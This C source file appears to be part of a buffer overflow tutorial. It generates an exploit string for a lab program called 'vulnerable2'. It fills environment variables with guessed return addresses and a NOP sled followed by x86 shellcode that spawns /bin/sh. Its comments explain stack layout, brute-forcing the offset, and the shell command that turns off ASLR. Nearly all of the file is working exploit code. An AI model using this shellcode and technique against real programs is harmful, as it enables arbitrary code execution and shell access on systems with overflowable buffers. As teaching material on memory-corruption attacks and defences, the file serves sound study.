//
// generator2.c
//
// Tool to craft the exploitation string.
// It accepts two parameters:
//     ret_buffer_size - the total length in bytes of the string that will be
//         later copied to the stack buffer of the vulnerable program. This
//         length must be greater than the buffer size, to which strcpy
//         function performs a copy. The string contains guessed return address.
//     offset_in_the_stack - the offset in bytes from the current process's
//         stack pointer a.k.a. top of the stack. This must be chosen
//         randomly and passed to generator2 program. In case of a shellcode in
//         environment variable, the offset must be negative.
//     shellcode_string_length - the total length in bytes of the shellcode
//         string that will be pointed to by the guessed return address.
// Notes:
//  The crafted exploitation string will be sent to vulnerable program by
// some other means, for instance, manually or with a bash script. It will
// eventually crash the vulnerable process. If this happens, the exit code of
// the process will not be 0 == Success. So, a new exploitation string must be
// generated, containing increased by 4 bytes offset in the stack (if the
// stack grows downwards in the memory, like it is presented below). This must
// be repeated until the exploitation will actually work. The return address
// from the function, containing overflowed buffer will point somewhere in the
// region of NOP instructions within our shellcode string.
// This is done with two assumptions:
//   1. stack region is always layed out by the kernel at the same address for
// each new program. And after program restart, the vulnerable buffer will be
// placed exactly at the same memory location as it was before. This was
// common before ASLR was introduced. Nowadays, to turn it off, we need:
//       # echo "0" > /proc/sys/kernel/randomize_va_space
//   2. our generator2 program's top of the stack is higher in memory than the
// vulnerable program's buffer of interest. Below is the possible layout of
// stacks in both programs:
//
// generator2!main:
// bottom of                                                            top of
// memory                                                               memory
//        esiz  egg   offs  bsiz  addr  buff  long  sfp   ret   argc  argv
// <---- [    ][    ][    ][    ][    ][    ][    ][    ][    ][    ][    ]
//       ^                                         ^                         ^
//      esp                                       ebp               0xffffe000
//
// top of                                                            bottom of
// stack                                                                 stack
//
//
//
// vulnerable2!vuln:
// bottom of                                                            top of
// memory                                                               memory
//        buff,8b   sfpv  retv  sfpm  retm  argc  argv     scod, 2048 bytes
// <---- [        ][    ][    ][    ][    ][    ][    ]...[                 ]
//       ^         ^                                                         ^
//      esp       ebp                                               0xffffe000
//
// top of                                                            bottom of
// stack                                                                 stack
//
// Where:
//     the amount of spaces reflects the actual amount of bytes, except scod
//     retm - address to which the processor will transfer its execution after
//            leaving the function main
//     retv - saved return address from function vulnerable.c!vuln()
//     sfpm - Stored Frame Pointer or EBP of the previous function, that
//            called main()
//     sfpv - saved stack frame pointer of function main(), that called vuln()
//     scod - shellcode in the $EGG var inside process environment block
//
// Note, that esp in the second case will be further from the bottom of the
// stack 0xffffe000, than it is in the first case. So, subtracting negative
// value of 4 bytes will actually increase the candidate return address,
// making it to point closer to the process environment block.
//

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const int DEFAULT_OFFSET = 0;
const int DEFAULT_BUFFER_SIZE = 8;
const int DEFAULT_EGG_SIZE = 2048;
const unsigned char NOP_INSTRUCTION = 0x90;

// This shellcode is taken from Steps 3 and 4 and it performs exec(/bin/sh)
char shellcode[] = {
    "\xeb\x1f\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff"
    "/bin/sh" // Note the terminating zero, and use strlen() or sizeof() - 1
              // to obtain shellcode's length!
};

unsigned long get_sp() {
    __asm__("movl %esp, %eax \n\t");
}

void main(int argc, char* argv[]) {
    if (argc > 1 && !strcmp(argv[1], "-h")) {
        printf("Usage:\n      %s <ret_buffer_size> <offset_in_the_stack> "
            "<shellcode_string_length>\n", argv[0]);
        exit(1);
    }

    int offset = DEFAULT_OFFSET, bsize = DEFAULT_BUFFER_SIZE,
        eggsize = DEFAULT_EGG_SIZE;
    if (argc > 1)
        bsize = atoi(argv[1]);
    if (argc > 2)
        offset = atoi(argv[2]);
    if (argc > 3)
        eggsize = atoi(argv[3]);
    if (bsize < DEFAULT_BUFFER_SIZE)
        exit(1);

    // Calculate return address candidate in vulnerable2.c program
    long address = get_sp() + offset;
    printf("Trying address: 0x%08x...\n", address);

    // Prepare the buffer with only return addresses
    bsize += 5; // 4 for RET= header, and 1 for string terminating null byte
    char* buffer = malloc(bsize);
    if (!buffer) {
        printf("Can't allocate memory, malloc(%d)\n", bsize);
        exit(1);
    }

    // Note that this will work only with the assumption that addresses on the
    // stack do not contain null bytes, e.g. 0xbffffdb4.
    // If the stack is located lower in memory, like in Windows, e.g. 0x00fcdda,
    // then strcpy will stop copying on the first null byte.

    // [RET.RET.RET.RET.]
    long* long_ptr = (long*)buffer;
    for (int i = 0; i < bsize / sizeof(long*); ++i)
        *(long_ptr++) = address;

    // [RET=RET.RET.RET.]
    memcpy(buffer, "RET=", 4);

    // putenv() function accepts ASCII strings
    buffer[bsize - 1] = '\0';

    // Set environment variable RET with the string, containing the newly
    // generated return addresses. This env variable will be passed to the
    // vulnerable2 program through argv as the string that overflows the buffer.
    putenv(buffer);

    // Prepare the buffer for shellcode string
    eggsize += 5; // 4 for EGG= header, and 1 for string terminating null byte
    char* egg = malloc(eggsize);
    if (!egg) {
        printf("Can't allocate memory, malloc(%d)\n", eggsize);
        exit(1);
    }

    // [NOP.NOP.NOP.NOP..........NOP.]
    memset(egg, NOP_INSTRUCTION, eggsize);

    // [EGG=NOP.NOP.NOP..........NOP.]
    memcpy(egg, "EGG=", 4);

    // [EGG=NOP.NOP.NOP.....SHELLCODE]
    memcpy(egg + eggsize - strlen(shellcode) - 1, shellcode, strlen(shellcode));

    // putenv() function accepts ASCII strings
    egg[eggsize - 1] = '\0';

    // Set environment variable EGG with the value of our shellcode string, it
    // will be copied by the elf loader to the stack of the called vulnerable2
    // program, so then we would just need to guess its location in memory.
    putenv(egg);

    // spawn a shell with $EGG and $RET in environment block
    system("/bin/bash ./fuzzer2.sh");
}
